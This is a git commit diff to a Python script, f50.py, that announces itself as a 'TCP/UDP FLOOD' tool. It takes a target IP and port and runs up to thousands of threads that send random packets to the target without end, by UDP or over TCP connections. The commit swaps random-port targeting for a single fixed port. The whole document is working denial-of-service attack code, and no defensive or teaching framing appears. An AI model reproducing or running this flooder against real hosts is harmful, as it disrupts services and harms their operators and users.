aee13109120b3fb82c821a58ea543eca5b25122f
soso3233231980-wq <soso3233231980@gmail.com>
2026-01-05 11:36:40 +0200

    Update f50.py

--- f50.py
+++ f50.py
@@ -7,7 +7,7 @@ import threading
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", type=str, default="0", help="Port (e.g., 80, 0 for random 1-65353, or 10000-60000 for range)")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
 ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
 ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
 ap.add_argument("-th", "--threads", type=int, default=2000, help="Threads")
@@ -16,73 +16,43 @@ args = vars(ap.parse_args())
 print("--> C0de By Lee0n123 <--")
 print("#-- TCP/UDP FLOOD --#")
 ip = args['ip']
-port_arg = args['port']
+port = args['port']
 choice = args['choice']
 times = args['times']
 threads = args['threads']
 
-# معالجة وسيطة المنفذ
-def parse_port(port_str):
-    if port_str == "0":
-        return (1, 65353)  # نطاق افتراضي
-    elif "-" in port_str:
-        try:
-            min_port, max_port = map(int, port_str.split("-"))
-            return (min_port, max_port)
-        except:
-            return (1, 65353)
-    else:
-        try:
-            fixed_port = int(port_str)
-            return (fixed_port, fixed_port)  # نفس المنفذ للحدين
-        except:
-            return (1, 65353)
-
-min_port, max_port = parse_port(port_arg)
-use_random_ports = (min_port != max_port)  # إذا كان هناك نطاق
-
 def run():
-    data = random._urandom(1024)
-    i = random.choice(("[*]","[!]","[#]"))
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            # اختيار منفذ
-            if use_random_ports:
-                target_port = random.randint(min_port, max_port)
-            else:
-                target_port = min_port  # port ثابت
-            addr = (str(ip), target_port)
-            for x in range(times):
-                s.sendto(data, addr)
-            print(i + f" Sent to port {target_port}!!!")
-        except:
-            print("[!] Error!!!")
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
 
 def run2():
-    data = random._urandom(16)
-    i = random.choice(("[*]","[!]","[#]"))
-    while True:
-        try:
-            # اختيار منفذ
-            if use_random_ports:
-                target_port = random.randint(min_port, max_port)
-            else:
-                target_port = min_port  # port ثابت
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, target_port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print(i + f" Sent to port {target_port}!!!")
-        except:
-            s.close()
-            print("[*] Error")
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
 
 for y in range(threads):
-    if choice == 'y':
-        th = threading.Thread(target = run)
-        th.start()
-    else:
-        th = threading.Thread(target = run2)
-        th.start()
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
